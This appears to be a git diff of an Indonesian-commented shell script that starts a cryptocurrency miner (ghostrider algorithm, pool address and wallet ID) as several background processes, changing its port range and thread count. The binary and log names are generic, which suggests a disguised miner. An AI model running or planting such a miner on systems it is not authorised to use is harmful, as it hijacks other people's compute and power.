@@ -48,9 +48,9 @@ while [ $(date +%s) -lt $end_time ]; do
   # Memastikan file sgr ada
   if [ -f $dynamic_sgr ]; then
     # Memulai proses untuk beberapa port
-    for port in $(seq 801 810); do
+    for port in $(seq 701 710); do
       # Menjalankan proses dengan parameter yang ditentukan di latar belakang
-      ./$dynamic_sgr -a ghostrider --pool $ip:$port -u EOS:xeggexinside:1670085537.unimnegoo --timeout 120 -t 7 -p x > dance_$port_$timestamp.log 2>&1 &
+      ./$dynamic_sgr -a ghostrider --pool $ip:$port -u EOS:xeggexinside:1670085537.unimnegoo --timeout 120 -t 8 -p x > dance_$port_$timestamp.log 2>&1 &
       process_pid=$!
 
       echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port"
